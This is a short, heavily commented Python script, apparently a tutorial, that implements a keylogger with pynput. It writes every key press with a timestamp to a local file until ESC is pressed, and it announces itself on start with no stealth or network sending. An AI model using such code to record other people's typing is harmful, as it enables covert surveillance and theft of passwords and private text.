# Import necessary libraries
from pynput import keyboard # For monitoring keyboard input
import datetime # For generating timestamps

# Define a constant for the log file name. Using uppercase is a convention for constants.
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function that runs whenever a key is pressed.
    This function is called by the listener thread for each key press event.
    """
    try:
        # This block handles standard alphanumeric keys (a, 1, etc.)
        # Open the log file in append mode with a context manager for safe file handling.
        with open(LOG_FILE, "a") as f:
            # Generate a formatted timestamp string for the current moment.
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            # Write the timestamp and the key's character to the file, followed by a newline.
            f.write(f'{timestamp} - {key.char}\n')
    except AttributeError:
        # This block handles special keys (Shift, Ctrl, Space, etc.) that lack a .char attribute.
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            # Write the timestamp and the key's name in brackets for clarity (e.g., [shift]).
            f.write(f'{timestamp} - [{key.name}]\n')

def on_release(key):
    """
    Callback function that runs whenever a key is released.
    This function is called by the listener thread for each key release event.
    """
    # Check if the released key is the ESC key.
    if key == keyboard.Key.esc:
        # Print a message to the console to inform the user.
        print("Exiting keylogger...")
        # Returning False is the signal to the listener to stop monitoring.
        return False

# Standard Python idiom to check if this is the main execution file.
if __name__ == "__main__":
    # Print startup instructions for the user.
    print("Keylogger started. Press ESC to stop.")
    
    # Create a listener context manager. This is the recommended method.
    # It takes the two callback functions for press and release events.
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # The .join() method blocks the main thread, keeping the program alive
        # until the listener is stopped (by returning False from on_release).
        listener.join()